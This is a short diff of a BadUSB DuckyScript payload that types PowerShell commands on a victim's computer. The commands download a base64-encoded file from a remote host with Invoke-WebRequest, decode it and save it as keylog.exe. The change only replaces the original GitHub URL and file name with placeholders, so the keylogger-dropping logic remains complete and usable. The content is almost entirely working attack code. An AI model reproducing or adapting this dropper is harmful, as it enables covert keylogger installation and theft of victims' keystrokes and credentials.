@@ -7,12 +7,12 @@ DELAY 1000
 
 
 REM Download encoded executable
-STRING $url='https://github.com/Chrislundh98/BadUSB/blob/main/Keylogger/encoded-20240308210244.txt'; $out='encoded-20240308210244.txt'; Invoke-WebRequest -Uri $url -OutFile $out
+STRING $url='https://YOUR_GITHUB_REPO.COM/PATH/TO/ENCODED/FILE.TXT'; $out='PLACEHOLDER_ENCODED_EXE.TXT'; Invoke-WebRequest -Uri $url -OutFile $out
 ENTER
 DELAY 1000
 
 REM Decode the file and save as .exe
-STRING $data=Get-Content -Path encoded-20240308210244.txt; $decoded=[System.Convert]::FromBase64String($data); [System.IO.File]::WriteAllBytes('keylog.exe', $decoded)
+STRING $data=Get-Content -Path PLACEHOLDER_ENCODED_EXE.TXT; $decoded=[System.Convert]::FromBase64String($data); [System.IO.File]::WriteAllBytes('keylog.exe', $decoded)
 ENTER
 DELAY 1000
 
